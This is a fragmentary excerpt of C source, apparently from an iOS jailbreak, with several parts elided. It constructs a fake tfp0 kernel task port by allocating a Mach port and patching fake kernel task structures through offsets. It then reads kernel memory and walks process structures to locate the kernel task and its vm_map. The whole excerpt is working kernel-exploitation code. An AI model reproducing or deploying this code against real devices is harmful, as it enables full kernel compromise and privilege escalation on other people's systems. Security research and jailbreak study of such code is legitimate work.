...
mach_port_t build_safe_fake_tfp0(uint64_t vm_map, uint64_t space) {
  ...
  mach_port_t _tfp0 = MACH_PORT_NULL;
  err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &_tfp0);
  if (err != KERN_SUCCESS) {
  ...
  *(uint8_t*)(fake_kernel_task + koffset(KSTRUCT_OFFSET_TASK_LCK_MTX_TYPE)) = 0x22;
  ...
  uint64_t port_kaddr = find_port_address(_tfp0, MACH_MSG_TYPE_MAKE_SEND);
...
#define IE_BITS_RECEIVE (1<<17)
  ...
  err = mach_vm_read(_tfp0, vm_map, 0x40, &data_out, &out_size);
  if (err != KERN_SUCCESS) {
...
//        // get the process name too
//        uint32_t comm = rk32(bsd_info + 0x26c);
//        printf("name unconverted: %d\n", comm);
//
//        char proc_name[20];
//        sprintf(proc_name, "%08x", comm);
//        proc_name[17] = 0;
//        printf("::name converted: %s\n", proc_name);
//
        if (pid == 0) {
            kernel_task = bsd_info;
            kernel_vm_map = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_VM_MAP));
